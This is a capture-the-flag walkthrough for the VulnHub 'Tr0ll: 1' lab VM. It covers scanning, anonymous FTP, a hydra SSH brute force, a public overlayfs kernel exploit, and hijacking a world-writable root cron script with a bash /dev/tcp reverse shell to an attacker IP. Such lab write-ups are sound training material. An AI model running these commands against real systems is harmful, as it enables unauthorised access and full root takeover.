# Tr0ll: 1

## 1.Get VM IP

```bash
root@kali: nmap -sn 192.168.127.0/24

Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 06:57 EDT
Nmap scan report for 192.168.127.1
Host is up (0.00042s latency).
MAC Address: 00:50:56:C0:00:01 (VMware)
Nmap scan report for 192.168.127.141
Host is up (0.00032s latency).
MAC Address: 00:0C:29:1C:FD:35 (VMware)
Nmap scan report for 192.168.127.254
Host is up (0.00037s latency).
MAC Address: 00:50:56:EF:E6:A0 (VMware)
Nmap scan report for 192.168.127.128
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 15.60 seconds
```

The ip address is `192.168.127.141`, let's enumerate it.

## 2.Enumeration

```bash
root@kali: nmap -sV -sC 192.168.127.141 -oN scan

Nmap scan report for 192.168.127.141
Host is up (0.00063s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.127.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 600
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/secret
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.7 (Ubuntu)
MAC Address: 00:0C:29:1C:FD:35 (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Visit `/robots.txt` of the web page and it shows a disallowed directory :

```text
User-agent:*
Disallow: /secret
```

visiting the above directory has nothing interesting, we take a look at port `21` for `anonymous` login :

```bash
root@kali: ftp 192.168.127.141

Connected to 192.168.127.141.
220 (vsFTPd 3.0.2)
Name (192.168.127.141:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||54900|).
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap
226 Directory send OK.
ftp> 
```

we find from here that file `lol.pcap` is available to download, so download and open it with wireshark

filter for `ftp-data` and you will find the packet wihch contains the secret directory :

![wireshark](https://github.com/Git-K3rnel/VulnHub/assets/127470407/556e5be5-5371-4f56-aafc-d4f58dff2da1)

just go to `sup3rs3cr3tdirlol` directory and there is file here called `roflmao` :

![download](https://github.com/Git-K3rnel/VulnHub/assets/127470407/56f7a830-c9af-4f5f-b2f5-85fd70b04fd7)

get this file and we notice this an executable, just run the program :

```bash
root@kali: ./roflmao

Find address 0x0856BF to proceed
```

it just prints a address of memory, since we have no program here that this executable knows the location already, i guessed

that it might me the actual directory we should navigate in the web site so go to `/0x0856BF` :

![directory](https://github.com/Git-K3rnel/VulnHub/assets/127470407/10cd92b7-4704-48c5-a92e-e5df417f47de)

download the files in these two folders :

```bash
root@kali: wget http://192.168.127.141/0x0856BF/good_luck/which_one_lol.txt

root@kali: wget http://192.168.127.141/0x0856BF/this_folder_contains_the_password/Pass.txt
```

inside the `which_one_lol.txt` file we see a list of users :

```txt
maleus
ps-aux
felux
Eagle11
genphlux
usmc8892
blawrg
wytshadow
vis1t0r
overflow
```

and inside `Pass.txt`, it just says `Good_job_:)`

## 3.Gaining Shell

I tried brute forcing the ssh with `Good_job` password but it did not work.

since it is just a crazy and ridiculous machine, i though that the folder `this_folder_contains_the_password` in the web site

we found earlier points to the fact that the name of the file `Pass.txt` is the real password

so i used hydra against the SSH service with `Pass.txt` as the password  :

```bash
root@kali:  hydra -L users.txt -p Pass.txt 192.168.127.141 ssh -V

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-17 07:29:08
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:10/p:1), ~1 try per task
[DATA] attacking ssh://192.168.127.141:22/
[ATTEMPT] target 192.168.127.141 - login "maleus" - pass "Pass.txt" - 1 of 10 [child 0] (0/0)
[ATTEMPT] target 192.168.127.141 - login "ps-aux" - pass "Pass.txt" - 2 of 10 [child 1] (0/0)
[ATTEMPT] target 192.168.127.141 - login "felux" - pass "Pass.txt" - 3 of 10 [child 2] (0/0)
[ATTEMPT] target 192.168.127.141 - login "Eagle11" - pass "Pass.txt" - 4 of 10 [child 3] (0/0)
[ATTEMPT] target 192.168.127.141 - login "genphlux" - pass "Pass.txt" - 5 of 10 [child 4] (0/0)
[ATTEMPT] target 192.168.127.141 - login "usmc8892" - pass "Pass.txt" - 6 of 10 [child 5] (0/0)
[ATTEMPT] target 192.168.127.141 - login "blawrg" - pass "Pass.txt" - 7 of 10 [child 6] (0/0)
[ATTEMPT] target 192.168.127.141 - login "wytshadow" - pass "Pass.txt" - 8 of 10 [child 7] (0/0)
[ATTEMPT] target 192.168.127.141 - login "vis1t0r" - pass "Pass.txt" - 9 of 10 [child 8] (0/0)
[ATTEMPT] target 192.168.127.141 - login "overflow" - pass "Pass.txt" - 10 of 10 [child 9] (0/0)
[22][ssh] host: 192.168.127.141   login: overflow   password: Pass.txt
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-17 07:29:11
```

yes the user `overflow` has the password `Pass.txt` so we can login to SSH with these credentials.

```bash
root@kali: ssh overflow@192.168.127.141

overflow@192.168.127.141's password: 
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Sep 17 04:31:12 2023 from 192.168.127.128
Could not chdir to home directory /home/overflow: No such file or directory
$ id
uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
$ 
```

## 4.Privilege Escalation Method 1

We just check the kernel version and os release version :

```bash
$ uname -a
Linux troll 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux

$ cat /etc/os-release
NAME="Ubuntu"
VERSION="14.04.1 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.1 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
```

If we check the `searchsploit` for any public exploit for this version we see :

```bash
root@kali: searchsploit linux 3.13
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation | linux/local/37292.c
```

this exploit matches with victim kernel version just upload it on the victim and compile and execute it :

```bash
$ cd /dev/shm
$ wget http://192.168.127.128/37292.c
--2023-09-17 04:39:38--  http://192.168.127.128/37292.c
Connecting to 192.168.127.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/x-csrc]
Saving to: ‘37292.c’

100%[=======================================================================================================================>] 4,968       --.-K/s   in 0.001s  

2023-09-17 04:39:38 (7.24 MB/s) - ‘37292.c’ saved [4968/4968]

$ ls
37292.c

$ gcc 37292.c

$ ls
37292.c  a.out

$ ./a.out
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library

# id
uid=0(root) gid=0(root) groups=0(root),1002(overflow)

# cd /root

# cat proof.txt
Good job, you did it! 


702a8c18d29c6f3ca0d99ef5712bfbdc
```

this is one method to get the flag.

## 5.Privilege Escalation Method 2

If you notice, you will get disconnected after afew minutes, this behavior is odd, so i just checked the `/etc/crontab`

but found nothing, and then checked `/var/log/cronlog` :

```bash
$ cat /var/log/cronlog
*/2 * * * * cleaner.py
```

yes we guessed correctly, the `cleaner.py` file is executed every 2 minutes.

we find the cleaner.py which is located here :

```bash
$ find / -name cleaner.py 2>/dev/null
/lib/log/cleaner.py
```

checking the permissions shows it is world writable :

```bash
$ ls -l /lib/log/cleaner.py
-rwxrwxrwx 1 root root 114 Sep 13 05:25 /lib/log/cleaner.py
```

the content of this file is :

```python
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

it just removes anything in `/tmp` directory, clever, but not too much :)

just change the content of cleaner.py to get a reverse shell, i uploaded a simple reverse shell to /dev/shm directory

and saved as shell.sh

```bash
root@kali: echo 'bash -i >& /dev/tcp/192.168.127.128/4444 0>&1' > shell.sh
root@kali: python -m http.server 80

$ cd /dev/shm
$ wget http://192.168.127.128/shell.sh
```

change the content of cleaner.py :

```python
#!/usr/bin/env python
import os
import sys
try:
     os.system('/bin/bash /dev/shm/shell.sh')
except:
     sys.exit()
```

and wait for the shell on your system listener :

```bash
root@kali: nc -nvlp 4444
   
listening on [any] 4444 ...
connect to [192.168.127.128] from (UNKNOWN) [192.168.127.141] 34383
bash: cannot set terminal process group (1841): Inappropriate ioctl for device
bash: no job control in this shell
root@troll:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@troll:~# 
```




